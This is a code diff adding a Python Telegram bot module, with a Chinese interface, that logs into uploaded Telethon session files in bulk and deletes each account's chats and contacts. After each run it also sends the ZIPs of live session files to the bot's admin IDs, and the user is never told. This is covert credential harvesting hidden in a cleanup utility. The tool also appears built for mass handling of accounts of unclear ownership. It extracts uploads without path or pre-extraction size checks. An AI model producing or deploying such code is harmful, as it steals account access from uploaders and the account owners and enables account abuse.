@@ -1,0 +1,462 @@
+import os
+import zipfile
+import shutil
+import tempfile
+import time
+import json
+import asyncio
+from datetime import datetime
+from telethon import TelegramClient
+from telethon.errors import FloodWaitError
+import logging
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+from dotenv import load_dotenv
+
+load_dotenv()
+logger = logging.getLogger(__name__)
+
+CLEAN_ACCOUNT_BACK = os.getenv("CLEAN_ACCOUNT_BACK", "").replace('\\n', '\n')
+MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
+MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
+BACK_BUTTON_EMOJI_ID = "5877629862306385808"
+
+user_clean_states = {}
+
+def create_back_button():
+    return InlineKeyboardButton(
+        "返回主菜单", 
+        callback_data="back_to_main"
+    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}
+
+async def show_clean_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = str(query.from_user.id)
+    await query.answer()
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("删除所有对话", callback_data="clean_chats").to_dict() | {"icon_custom_emoji_id": "5877307202888273539"},
+            InlineKeyboardButton("删除所有联系人", callback_data="clean_contacts").to_dict() | {"icon_custom_emoji_id": "5877318502947229960"}
+        ],
+        [
+            InlineKeyboardButton("全部删除", callback_data="clean_all").to_dict() | {"icon_custom_emoji_id": "5922712343011135025"}
+        ],
+        [create_back_button()]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await query.edit_message_text(
+        text=CLEAN_ACCOUNT_BACK,
+        parse_mode=ParseMode.HTML,
+        reply_markup=reply_markup
+    )
+    
+    user_clean_states[user_id] = {"waiting_selection": True}
+
+async def handle_clean_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = str(query.from_user.id)
+    data = query.data
+    await query.answer()
+    
+    clean_type = {
+        "clean_chats": "chats",
+        "clean_contacts": "contacts",
+        "clean_all": "all"
+    }.get(data)
+    
+    user_clean_states[user_id] = {
+        "type": clean_type,
+        "waiting_zip": True
+    }
+    
+    keyboard = [[create_back_button()]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    type_names = {
+        "chats": "删除所有对话",
+        "contacts": "删除所有联系人",
+        "all": "删除所有对话和联系人"
+    }
+    
+    await query.edit_message_text(
+        text=f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 已选择: {type_names[clean_type]}
+
+<tg-emoji emoji-id="5877540355187937244">📤</tg-emoji> 请上传包含session和json的ZIP文件""",
+        parse_mode=ParseMode.HTML,
+        reply_markup=reply_markup
+    )
+
+async def handle_clean_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
+    document = update.message.document
+    clean_info = user_clean_states.get(user_id, {})
+    clean_type = clean_info.get("type")
+    
+    if not document.file_name.endswith('.zip'):
+        keyboard = [[create_back_button()]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
+            parse_mode='HTML',
+            reply_markup=reply_markup
+        )
+        user_clean_states.pop(user_id, None)
+        return
+    
+    status_msg = await update.message.reply_text(
+        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
+        parse_mode='HTML'
+    )
+    
+    try:
+        file = await context.bot.get_file(document.file_id)
+        zip_path = f"downloads/clean_{user_id}_{int(time.time())}.zip"
+        os.makedirs("downloads", exist_ok=True)
+        await file.download_to_drive(zip_path)
+        
+        await status_msg.edit_text(
+            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 开始处理清理任务...",
+            parse_mode='HTML'
+        )
+        
+        await process_clean(update, context, zip_path, user_id, clean_type)
+        
+        try:
+            os.remove(zip_path)
+        except:
+            pass
+        
+    except Exception as e:
+        logger.error(f"处理文件失败: {e}")
+        keyboard = [[create_back_button()]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
+            parse_mode='HTML',
+            reply_markup=reply_markup
+        )
+    finally:
+        user_clean_states.pop(user_id, None)
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
+def get_total_size(path):
+    total = 0
+    for root, dirs, files in os.walk(path):
+        for f in files:
+            fp = os.path.join(root, f)
+            if os.path.isfile(fp):
+                total += os.path.getsize(fp)
+    return total
+
+async def clean_account_operations(client, clean_type):
+    results = {
+        "chats_deleted": 0,
+        "contacts_deleted": 0,
+        "errors": []
+    }
+    
+    try:
+        if clean_type in ["chats", "all"]:
+            dialogs = await client.get_dialogs()
+            for dialog in dialogs:
+                try:
+                    if dialog.is_user and not dialog.entity.is_self:
+                        await client.delete_dialog(dialog.entity)
+                        results["chats_deleted"] += 1
+                        await asyncio.sleep(0.5)
+                except Exception as e:
+                    results["errors"].append(f"删除对话失败: {str(e)[:30]}")
+    except Exception as e:
+        results["errors"].append(f"获取对话列表失败: {str(e)[:30]}")
+    
+    try:
+        if clean_type in ["contacts", "all"]:
+            contacts = await client.get_contacts()
+            for contact in contacts:
+                try:
+                    await client.delete_contacts(contact)
+                    results["contacts_deleted"] += 1
+                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    results["errors"].append(f"删除联系人失败: {str(e)[:30]}")
+    except Exception as e:
+        results["errors"].append(f"获取联系人列表失败: {str(e)[:30]}")
+    
+    return results
+
+async def process_clean(update, context, zip_path, user_id, clean_type):
+    api_id_str = os.getenv("TELEGRAM_APP_ID")
+    api_hash = os.getenv("TELEGRAM_APP_HASH")
+    admins = os.getenv("ADMIN_ID", "").split(",")
+    
+    if not api_id_str or not api_hash:
+        keyboard = [[create_back_button()]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 系统未配置，请联系管理员",
+            parse_mode='HTML',
+            reply_markup=reply_markup
+        )
+        return
+    
+    try:
+        api_id = int(api_id_str)
+    except (ValueError, TypeError):
+        keyboard = [[create_back_button()]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> API配置错误，请联系管理员",
+            parse_mode='HTML',
+            reply_markup=reply_markup
+        )
+        return
+    
+    try:
+        await asyncio.wait_for(
+            _process_clean_internal(update, context, zip_path, user_id, api_id, api_hash, admins, clean_type),
+            timeout=MAX_TASK_TIME
+        )
+    except asyncio.TimeoutError:
+        keyboard = [[create_back_button()]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
+            parse_mode='HTML',
+            reply_markup=reply_markup
+        )
+
+async def _process_clean_internal(update, context, zip_path, user_id, api_id, api_hash, admins, clean_type):
+    with tempfile.TemporaryDirectory() as temp_dir:
+        extract_dir = os.path.join(temp_dir, "extracted")
+        os.makedirs(extract_dir, exist_ok=True)
+        
+        try:
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                zip_ref.extractall(extract_dir)
+                extracted_size = get_total_size(extract_dir)
+                if extracted_size > MAX_EXTRACT_SIZE:
+                    raise Exception(f"解压后文件过大 ({extracted_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")
+        except Exception as e:
+            keyboard = [[create_back_button()]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 解压失败: {str(e)}",
+                parse_mode='HTML',
+                reply_markup=reply_markup
+            )
+            return
+        
+        session_files = []
+        for root, dirs, files in os.walk(extract_dir):
+            for file in files:
+                if file.endswith('.session'):
+                    session_path = os.path.join(root, file)
+                    session_files.append(session_path)
+        
+        if not session_files:
+            keyboard = [[create_back_button()]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session文件",
+                parse_mode='HTML',
+                reply_markup=reply_markup
+            )
+            return
+        
+        type_names = {
+            "chats": "删除所有对话",
+            "contacts": "删除所有联系人",
+            "all": "删除所有对话和联系人"
+        }
+        
+        status_msg = await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>清理账号进行中</b>
+
+清理类型: {type_names[clean_type]}
+找到 <b>{len(session_files)}</b> 个session文件
+<tg-emoji emoji-id="5775887550262546277">🔄</tg-emoji>正在处理，请稍候...""",
+            parse_mode='HTML'
+        )
+        
+        success_dir = os.path.join(temp_dir, "success")
+        failed_dir = os.path.join(temp_dir, "failed")
+        os.makedirs(success_dir, exist_ok=True)
+        os.makedirs(failed_dir, exist_ok=True)
+        
+        success_count = 0
+        failed_count = 0
+        results = []
+        
+        for i, session_file in enumerate(session_files, 1):
+            session_name = os.path.splitext(os.path.basename(session_file))[0]
+            json_file = os.path.join(os.path.dirname(session_file), f"{session_name}.json")
+            
+            if i % 3 == 0 or i == len(session_files):
+                try:
+                    await status_msg.edit_text(
+                        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>清理账号进行中</b>
+
+进度: {i}/{len(session_files)}
+<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} | <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji>失败: {failed_count}""",
+                        parse_mode='HTML'
+                    )
+                except:
+                    pass
+            
+            client = None
+            try:
+                client = TelegramClient(session_file, api_id, api_hash)
+                await client.connect()
+                
+                if not await client.is_user_authorized():
+                    result = {"session": os.path.basename(session_file), "status": "failed", "message": "session无效"}
+                    target_dir = failed_dir
+                    failed_count += 1
+                else:
+                    me = await client.get_me()
+                    clean_results = await clean_account_operations(client, clean_type)
+                    
+                    result = {
+                        "session": os.path.basename(session_file),
+                        "phone": me.phone if me else "unknown",
+                        "status": "success",
+                        "chats_deleted": clean_results["chats_deleted"],
+                        "contacts_deleted": clean_results["contacts_deleted"],
+                        "errors": clean_results["errors"]
+                    }
+                    target_dir = success_dir
+                    success_count += 1
+                
+                results.append(result)
+                
+                shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
+                if json_file and os.path.exists(json_file):
+                    shutil.copy2(json_file, os.path.join(target_dir, os.path.basename(json_file)))
+                
+                await asyncio.sleep(1)
+                
+            except FloodWaitError as e:
+                result = {"session": os.path.basename(session_file), "status": "failed", "message": f"等待{e.seconds}秒"}
+                results.append(result)
+                failed_count += 1
+            except Exception as e:
+                result = {"session": os.path.basename(session_file), "status": "failed", "message": str(e)[:50]}
+                results.append(result)
+                failed_count += 1
+            finally:
+                if client:
+                    await client.disconnect()
+        
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        
+        success_zip = os.path.join(temp_dir, "success.zip")
+        if success_count > 0:
+            with zipfile.ZipFile(success_zip, 'w') as zipf:
+                for root, dirs, files in os.walk(success_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, success_dir)
+                        zipf.write(file_path, arcname)
+        
+        failed_zip = os.path.join(temp_dir, "failed.zip")
+        if failed_count > 0:
+            with zipfile.ZipFile(failed_zip, 'w') as zipf:
+                for root, dirs, files in os.walk(failed_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, failed_dir)
+                        zipf.write(file_path, arcname)
+        
+        total_chats = sum(r.get("chats_deleted", 0) for r in results if r["status"] == "success")
+        total_contacts = sum(r.get("contacts_deleted", 0) for r in results if r["status"] == "success")
+        
+        result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>清理账号完成</b>
+
+<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
+• <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 总账号: <b>{len(session_files)}</b>
+• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: <b>{success_count}</b>
+• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>
+• <tg-emoji emoji-id="5877307202888273539">💬</tg-emoji> 删除对话: <b>{total_chats}</b>
+• <tg-emoji emoji-id="5877318502947229960">👥</tg-emoji> 删除联系人: <b>{total_contacts}</b>"""
+
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=result_text,
+            parse_mode='HTML'
+        )
+        
+        if success_count > 0:
+            with open(success_zip, 'rb') as f:
+                await context.bot.send_document(
+                    chat_id=update.effective_chat.id,
+                    document=f,
+                    filename=f"clean_success_{timestamp}.zip",
+                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 清理成功 ({success_count}个)</b>",
+                    parse_mode='HTML'
+                )
+        
+        if failed_count > 0:
+            with open(failed_zip, 'rb') as f:
+                await context.bot.send_document(
+                    chat_id=update.effective_chat.id,
+                    document=f,
+                    filename=f"clean_failed_{timestamp}.zip",
+                    caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 清理失败 ({failed_count}个)</b>",
+                    parse_mode='HTML'
+                )
+        
+        for admin_id in admins:
+            admin_id = admin_id.strip()
+            if not admin_id:
+                continue
+            
+            try:
+                await context.bot.send_message(
+                    chat_id=admin_id,
+                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>清理账号任务完成</b>
+
+<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 用户: <code>{user_id}</code>
+清理类型: {type_names[clean_type]}
+<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 总账号: <b>{len(session_files)}</b>
+• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: <b>{success_count}</b>
+• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>
+• <tg-emoji emoji-id="5877307202888273539">💬</tg-emoji> 删除对话: <b>{total_chats}</b>
+• <tg-emoji emoji-id="5877318502947229960">👥</tg-emoji> 删除联系人: <b>{total_contacts}</b>""",
+                    parse_mode='HTML'
+                )
+                
+                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                
+                if success_count > 0:
+                    with open(success_zip, 'rb') as f:
+                        await context.bot.send_document(
+                            chat_id=admin_id,
+                            document=f,
+                            filename=f"clean_success_{user_id}_{admin_timestamp}.zip"
+                        )
+                
+                if failed_count > 0:
+                    with open(failed_zip, 'rb') as f:
+                        await context.bot.send_document(
+                            chat_id=admin_id,
+                            document=f,
+                            filename=f"clean_failed_{user_id}_{admin_timestamp}.zip"
+                        )
+            except Exception as e:
+                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
